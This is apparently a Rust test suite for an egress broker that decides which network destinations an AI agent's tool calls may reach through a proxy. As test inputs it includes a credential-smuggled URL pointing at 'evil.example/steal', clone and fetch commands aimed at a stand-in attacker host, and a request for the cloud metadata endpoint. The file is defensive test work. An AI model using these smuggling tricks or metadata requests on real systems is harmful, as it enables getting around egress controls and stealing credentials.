//! The egress bound, decided by the broker.
//!
//! What these assert, in one line: the decision is per destination, it is taken on every
//! destination a call names rather than only on a `host` or `url` argument, it fails closed, and
//! nothing about it claims containment this system does not have.

use std::collections::{BTreeMap, BTreeSet};

use warrantor_warrant::egress::{
    capability_for, destinations_of, render_decision, DenyReason, EgressBroker, EgressVerdict,
    ENFORCEMENT_NOTE,
};
use warrantor_warrant::proxy::{Decision, Proxy, ProxyMode, ToolCall};
use warrantor_warrant::staging::EffectRegistry;
use warrantor_warrant::{bound_strengths, BoundStrength, SideEffectClass, WarrantBounds};

const NOW: u64 = 1_786_000_000;

fn bounds_with(hosts: &[&str]) -> WarrantBounds {
    WarrantBounds {
        tools: ["git", "cargo", "github.create_pr"]
            .into_iter()
            .map(str::to_string)
            .collect(),
        write_paths: ["src/**".to_string()].into_iter().collect(),
        egress_hosts: hosts.iter().map(|h| (*h).to_string()).collect(),
        staged_classes: [SideEffectClass::Write].into_iter().collect(),
        expires_at: NOW + 3600,
        budget_cents_observed: None,
        delegation_depth: 2,
    }
}

fn call(tool: &str, args: &[(&str, &str)]) -> ToolCall {
    ToolCall {
        tool: tool.to_string(),
        arguments: args
            .iter()
            .map(|(k, v)| ((*k).to_string(), (*v).to_string()))
            .collect(),
        side_effect: SideEffectClass::Read,
    }
}

fn proxy_for(hosts: &[&str]) -> Proxy {
    Proxy::new(
        bounds_with(hosts),
        ProxyMode::Enforce,
        EffectRegistry::github(),
    )
}

fn deny_reason(proxy: &Proxy) -> DenyReason {
    proxy
        .egress_refusals()
        .first()
        .expect("a refusal was recorded")
        .reason
        .clone()
}

// ── the broker's decision ─────────────────────────────────────────────────────────────

#[test]
fn a_permitted_destination_is_allowed_with_its_capability() {
    let broker = EgressBroker::for_bounds(&bounds_with(&["api.github.com"]));
    match broker.decide("api.github.com") {
        EgressVerdict::Allow {
            logical_endpoint,
            pinned_addresses,
            ..
        } => {
            assert_eq!(logical_endpoint, "api.github.com");
            assert_eq!(
                pinned_addresses,
                vec!["api.github.com".to_string()],
                "the catalogue holds the name the developer wrote; nothing here resolves DNS"
            );
        }
        other => panic!("expected an allow, got {other:?}"),
    }
}

#[test]
fn a_destination_outside_the_bound_is_denied_as_not_catalogued() {
    let broker = EgressBroker::for_bounds(&bounds_with(&["api.github.com"]));
    assert_eq!(
        broker.decide("api.stripe.com"),
        EgressVerdict::Deny {
            reason: DenyReason::NotInCatalog
        }
    );
}

/// An absent limit means none, and the broker's own default-deny says the same thing.
#[test]
fn an_empty_egress_bound_has_no_catalogue_at_all() {
    let broker = EgressBroker::for_bounds(&bounds_with(&[]));
    assert_eq!(broker.catalogued(), 0);
    assert!(
        broker.catalog_digest().is_none(),
        "no catalogue at all, rather than an empty one that could be mistaken for a permissive one"
    );
    assert_eq!(
        broker.decide("api.github.com"),
        EgressVerdict::Deny {
            reason: DenyReason::CatalogUnavailable
        }
    );
}

/// The capability the list-membership check did not have: a metadata address is refused even when
/// the warrant names it. `--egress 169.254.169.254` no longer reaches the metadata service.
#[test]
fn a_metadata_address_is_refused_even_when_the_warrant_names_it() {
    let broker = EgressBroker::for_bounds(&bounds_with(&["169.254.169.254"]));
    assert_eq!(
        broker.catalogued(),
        1,
        "it IS catalogued -- that is the point of the test"
    );
    assert_eq!(
        broker.decide("169.254.169.254"),
        EgressVerdict::Deny {
            reason: DenyReason::MetadataRange
        }
    );
}

/// The catalogue is derived, not signed, and says so by carrying no signature at all.
#[test]
fn the_derived_catalogue_does_not_pretend_to_be_signed() {
    let broker = EgressBroker::for_bounds(&bounds_with(&["api.github.com"]));
    let digest = broker.catalog_digest().expect("a catalogue");
    assert!(!digest.is_empty());
    // The broker never verifies a catalogue signature, so a signature-shaped field here would be
    // decoration. What makes this catalogue trustworthy is the signed claims it came from.
    assert!(
        !ENFORCEMENT_NOTE.is_empty() && ENFORCEMENT_NOTE.contains("MCP proxy"),
        "every human-facing surface must carry where this is actually decided"
    );
}

// ── finding destinations in a call ────────────────────────────────────────────────────

#[test]
fn an_ordinary_argument_is_not_a_destination() {
    let found = destinations_of(&call(
        "github.create_pr",
        &[("title", "Fix token refresh"), ("body", "no links here")],
    ));
    assert!(
        found.is_empty(),
        "scanning must not invent destinations out of prose: {found:?}"
    );
}

#[test]
fn a_destination_key_carries_a_bare_hostname() {
    let found = destinations_of(&call("git", &[("endpoint", "api.stripe.com")]));
    assert_eq!(found.len(), 1);
    assert_eq!(found[0].host, "api.stripe.com");
    assert_eq!(found[0].argument, "endpoint");
}

#[test]
fn a_url_inside_a_compound_argument_is_found() {
    let found = destinations_of(&call(
        "git",
        &[("args", "clone https://evil.example/repo.git --depth 1")],
    ));
    assert_eq!(found.len(), 1);
    assert_eq!(found[0].host, "evil.example");
}

/// Every destination is found, and each is decided once however many times it is named.
#[test]
fn every_destination_in_one_call_is_found_exactly_once() {
    let found = destinations_of(&call(
        "git",
        &[
            ("url", "https://api.github.com/repos/o/r"),
            ("remote", "api.github.com"),
            (
                "args",
                "mirror https://api.stripe.com/v1 https://api.github.com/x",
            ),
        ],
    ));
    let hosts: Vec<&str> = found.iter().map(|d| d.host.as_str()).collect();
    assert_eq!(
        hosts,
        vec!["api.stripe.com", "api.github.com"],
        "both destinations, each once, in a deterministic order: {found:?}"
    );
}

// ── the proxy ─────────────────────────────────────────────────────────────────────────

#[test]
fn a_permitted_host_is_forwarded() {
    let mut proxy = proxy_for(&["api.github.com"]);
    assert_eq!(
        proxy.decide(&call("git", &[("url", "https://api.github.com/repos/o/r")])),
        Decision::Forward
    );
    assert!(proxy.egress_refusals().is_empty());
}

#[test]
fn a_refusal_names_the_destination_the_argument_and_the_reason() {
    let mut proxy = proxy_for(&["api.github.com"]);
    let decision = proxy.decide(&call(
        "git",
        &[("url", "https://api.stripe.com/v1/charges")],
    ));
    match decision {
        Decision::Deny { bound, reason } => {
            assert_eq!(bound, "egress_hosts", "the bound label is unchanged");
            assert!(reason.contains("api.stripe.com"), "reason was: {reason}");
            assert!(
                reason.contains("url"),
                "it must say where to look: {reason}"
            );
            assert!(
                !reason.contains("api.github.com"),
                "a refusal must not enumerate the boundary it just enforced: {reason}"
            );
        }
        other => panic!("expected a denial, got {other:?}"),
    }

    let refusals = proxy.egress_refusals();
    assert_eq!(refusals.len(), 1);
    assert_eq!(refusals[0].destination, "api.stripe.com");
    assert_eq!(refusals[0].argument, "url");
    assert_eq!(refusals[0].tool, "git");
    assert_eq!(refusals[0].reason, DenyReason::NotInCatalog);
    assert_eq!(
        refusals[0].capability,
        capability_for("api.stripe.com"),
        "the capability the call would have needed, spelled out"
    );
}

/// The hole the broker had to close: the old check looked at `host` and `url` and nothing else, so
/// a tool taking `endpoint` reached Forward with no egress evaluation at all.
#[test]
fn a_destination_named_in_an_unlisted_argument_is_still_decided() {
    for key in ["endpoint", "base_url", "server", "api_url", "webhook_url"] {
        let mut proxy = proxy_for(&["api.github.com"]);
        let decision = proxy.decide(&call("git", &[(key, "api.stripe.com")]));
        assert!(
            matches!(
                decision,
                Decision::Deny {
                    bound: "egress_hosts",
                    ..
                }
            ),
            "{key} must be decided, got {decision:?}"
        );
    }
}

/// A destination that never appears under a name the proxy could guess: buried in a command line.
#[test]
fn a_url_buried_in_a_compound_argument_is_refused() {
    let mut proxy = proxy_for(&["api.github.com"]);
    let decision = proxy.decide(&call(
        "git",
        &[("args", "clone https://evil.example/repo.git")],
    ));
    match decision {
        Decision::Deny { bound, reason } => {
            assert_eq!(bound, "egress_hosts");
            assert!(reason.contains("evil.example"), "reason was: {reason}");
        }
        other => panic!("expected a denial, got {other:?}"),
    }
}

/// The tamper case: userinfo shaped like a permitted host. The host is what comes after the `@`,
/// which is what the request would actually reach — and it holds inside a compound argument too.
#[test]
fn a_credential_smuggled_host_is_refused_wherever_it_hides() {
    for (key, value) in [
        ("url", "https://api.github.com@evil.example/steal"),
        ("args", "fetch https://api.github.com@evil.example/steal"),
    ] {
        let mut proxy = proxy_for(&["api.github.com"]);
        let decision = proxy.decide(&call("git", &[(key, value)]));
        assert!(
            matches!(
                decision,
                Decision::Deny {
                    bound: "egress_hosts",
                    ..
                }
            ),
            "{key} smuggling must not pass: {decision:?}"
        );
        assert_eq!(
            proxy.egress_refusals()[0].destination,
            "evil.example",
            "the refusal must name the host the request would really reach"
        );
    }
}

/// One permitted destination in a call does not license an unpermitted one beside it.
#[test]
fn one_denied_destination_denies_the_whole_call() {
    let mut proxy = proxy_for(&["api.github.com"]);
    let decision = proxy.decide(&call(
        "git",
        &[
            ("url", "https://api.github.com/repos/o/r"),
            ("remote", "api.stripe.com"),
        ],
    ));
    assert!(
        matches!(
            decision,
            Decision::Deny {
                bound: "egress_hosts",
                ..
            }
        ),
        "got {decision:?}"
    );
    assert_eq!(proxy.egress_refusals()[0].destination, "api.stripe.com");
}

#[test]
fn several_permitted_destinations_in_one_call_are_all_allowed() {
    let mut proxy = proxy_for(&["api.github.com", "crates.io"]);
    assert_eq!(
        proxy.decide(&call(
            "git",
            &[
                ("url", "https://api.github.com/repos/o/r"),
                ("remote", "crates.io"),
            ],
        )),
        Decision::Forward
    );
}

#[test]
fn an_empty_egress_bound_denies_with_catalog_unavailable() {
    let mut proxy = proxy_for(&[]);
    let decision = proxy.decide(&call("git", &[("url", "https://api.github.com/x")]));
    assert!(
        matches!(
            decision,
            Decision::Deny {
                bound: "egress_hosts",
                ..
            }
        ),
        "an absent bound means none, never unlimited: {decision:?}"
    );
    assert_eq!(deny_reason(&proxy), DenyReason::CatalogUnavailable);
}

#[test]
fn a_metadata_address_is_refused_at_the_proxy_too() {
    let mut proxy = proxy_for(&["169.254.169.254"]);
    let decision = proxy.decide(&call(
        "git",
        &[("url", "http://169.254.169.254/latest/meta-data")],
    ));
    assert!(
        matches!(
            decision,
            Decision::Deny {
                bound: "egress_hosts",
                ..
            }
        ),
        "a warrant naming the metadata service still does not reach it: {decision:?}"
    );
    assert_eq!(deny_reason(&proxy), DenyReason::MetadataRange);
}

/// A looping agent must not flood the report, and the count must stay per destination.
#[test]
fn refusals_are_counted_per_destination() {
    let mut proxy = proxy_for(&["api.github.com"]);
    for _ in 0..7 {
        proxy.decide(&call("git", &[("url", "https://a.example/x")]));
    }
    proxy.decide(&call("git", &[("url", "https://b.example/x")]));

    let refusals = proxy.egress_refusals();
    assert_eq!(refusals.len(), 2, "two destinations, not eight refusals");
    assert_eq!(refusals[0].destination, "a.example");
    assert_eq!(refusals[0].count, 7, "the count says it looped");
    assert_eq!(refusals[1].count, 1);
}

/// Observe mode records; it does not refuse. Wiring the broker must not change that, or an observe
/// run could no longer author a warrant from what an agent actually did.
#[test]
fn observe_mode_still_does_not_refuse_egress() {
    let mut proxy = Proxy::new(
        bounds_with(&[]),
        ProxyMode::Observe,
        EffectRegistry::github(),
    );
    assert_eq!(
        proxy.decide(&call("git", &[("url", "https://anywhere.example/x")])),
        Decision::Forward
    );
    assert!(proxy.egress_refusals().is_empty());
}

/// A port is not a destination, and neither is a path. Both are stripped before the decision, so a
/// warrant naming a host permits it on any port — which is what it has always meant.
#[test]
fn a_port_does_not_change_the_destination() {
    let mut proxy = proxy_for(&["api.github.com"]);
    assert_eq!(
        proxy.decide(&call("git", &[("url", "https://api.github.com:8443/x")])),
        Decision::Forward
    );
}

/// The deliberate false positive, asserted so it cannot be mistaken for a bug later: a URL quoted
/// in prose is treated as a destination. The proxy cannot tell a link the agent means to fetch from
/// one it means to write down, and refusing is the fail-closed reading.
#[test]
fn a_url_quoted_in_prose_is_refused_deliberately() {
    let mut proxy = proxy_for(&["api.github.com"]);
    let decision = proxy.decide(&ToolCall {
        tool: "github.create_pr".to_string(),
        arguments: BTreeMap::from([(
            "body".to_string(),
            "see https://blog.example/post for context".to_string(),
        )]),
        side_effect: SideEffectClass::Write,
    });
    assert!(
        matches!(
            decision,
            Decision::Deny {
                bound: "egress_hosts",
                ..
            }
        ),
        "an unknown host in an argument is treated as a destination: {decision:?}"
    );
}

// ── honesty ───────────────────────────────────────────────────────────────────────────

/// The whole point of the constraint: wiring the broker changed WHICH decision is made, not WHERE.
#[test]
fn the_egress_bound_is_still_only_as_strong_as_it_was() {
    let strengths: BTreeMap<&str, BoundStrength> = bound_strengths().into_iter().collect();
    assert_eq!(
        strengths.get("egress_hosts"),
        Some(&BoundStrength::Enforced),
        "unchanged: enforced for calls that traverse the proxy, which is what it always meant"
    );
    assert!(
        ENFORCEMENT_NOTE.contains("no network namespace, seccomp filter or firewall"),
        "the note printed beside every decision must keep saying what is not there"
    );
}

/// Nothing rendered to a human may imply containment. Asserted on the strings themselves, because
/// this is exactly the kind of wording that drifts.
#[test]
fn no_rendered_decision_claims_containment() {
    let broker = EgressBroker::for_bounds(&bounds_with(&["api.github.com"]));
    // A separate warrant that names the metadata service, so the metadata line is the reason it
    // claims to be rather than an ordinary not-catalogued denial.
    let permissive = EgressBroker::for_bounds(&bounds_with(&["169.254.169.254"]));
    let lines = vec![
        render_decision("api.github.com", &broker.decide("api.github.com")),
        render_decision("api.stripe.com", &broker.decide("api.stripe.com")),
        render_decision("169.254.169.254", &permissive.decide("169.254.169.254")),
    ];
    for line in &lines {
        let lower = line.to_lowercase();
        for forbidden in ["sandbox", "firewall", "seccomp", "namespace", "blocked at"] {
            assert!(
                !lower.contains(forbidden),
                "{line:?} implies containment this system does not have ({forbidden})"
            );
        }
    }
    assert!(lines[0].contains("allow"));
    assert!(lines[1].contains("not_in_catalog"));
    assert!(lines[2].contains("metadata_range"));
}

/// The bound the broker reads is the one inside the signed claims, so an agent cannot widen its own
/// catalogue: it would have to re-sign the warrant, which it cannot do.
#[test]
fn the_catalogue_follows_the_bound_it_was_derived_from() {
    let narrow = EgressBroker::for_bounds(&bounds_with(&["api.github.com"]));
    let wide = EgressBroker::for_bounds(&bounds_with(&["api.github.com", "api.stripe.com"]));
    assert_eq!(narrow.catalogued(), 1);
    assert_eq!(wide.catalogued(), 2);
    assert_ne!(
        narrow.catalog_digest(),
        wide.catalog_digest(),
        "a different bound is a different catalogue"
    );
    assert!(matches!(
        wide.decide("api.stripe.com"),
        EgressVerdict::Allow { .. }
    ));
}

/// Guard against an empty-set reading of the tool allowlist changing egress behaviour: egress is
/// decided after the allowlist, so an unlisted tool still denies under `tools`.
#[test]
fn an_unlisted_tool_still_denies_under_tools_not_egress() {
    let mut proxy = proxy_for(&["api.github.com"]);
    let decision = proxy.decide(&call("curl", &[("url", "https://api.stripe.com/x")]));
    match decision {
        Decision::Deny { bound, .. } => assert_eq!(bound, "tools"),
        other => panic!("expected a tools denial, got {other:?}"),
    }
    assert!(
        proxy.egress_refusals().is_empty(),
        "the call never got as far as an egress decision"
    );
}

/// `BTreeSet` is the bound's own type; this only pins that an unsorted input cannot change the
/// decision, since the catalogue is derived from it.
#[test]
fn catalogue_derivation_does_not_depend_on_input_order() {
    let mut a = bounds_with(&[]);
    a.egress_hosts = BTreeSet::from(["b.example".to_string(), "a.example".to_string()]);
    let mut b = bounds_with(&[]);
    b.egress_hosts = BTreeSet::from(["a.example".to_string(), "b.example".to_string()]);
    assert_eq!(
        EgressBroker::for_bounds(&a).catalog_digest(),
        EgressBroker::for_bounds(&b).catalog_digest()
    );
}

// ── the fail-open regression, pinned ──────────────────────────────────────────────────

/// An argument *named* as a destination whose value the proxy cannot resolve must deny.
///
/// Regression: `destinations_of` skipped any host that resolved empty, which was right for the
/// scan-every-argument rule and exactly wrong for the destination-key rule. The effect was that a
/// call naming `url="{{TEMPLATE}}"` produced no destination at all and forwarded — fail-open on
/// precisely the inputs where the proxy cannot see where the call is going. Before the wiring the
/// same input produced `target = ""`, which no allowlist contains, and denied.
#[test]
fn a_destination_key_that_resolves_to_nothing_is_still_refused() {
    for unresolvable in ["", "{{TEMPLATE}}", "   ", "$ENV_VAR"] {
        let found = destinations_of(&call("git", &[("url", unresolvable)]));
        assert!(
            !found.is_empty(),
            "url={unresolvable:?} named a destination the proxy could not resolve; \
             dropping it forwards the call"
        );

        let mut proxy = proxy_for(&["api.github.com"]);
        let decision = proxy.decide(&call("git", &[("url", unresolvable)]));
        assert!(
            !matches!(decision, Decision::Forward),
            "url={unresolvable:?} must not forward: an unresolvable destination is refused, \
             not ignored"
        );
    }
}

/// The other half of the same rule: an argument that is *not* a destination key and contains no
/// URL still names nothing, and must not manufacture a phantom refusal.
#[test]
fn an_ordinary_argument_with_no_url_names_no_destination() {
    let found = destinations_of(&call("cargo", &[("args", "build --release")]));
    assert!(
        found.is_empty(),
        "a plain argument with no URL and no destination name must yield no destination, got {found:?}"
    );
}
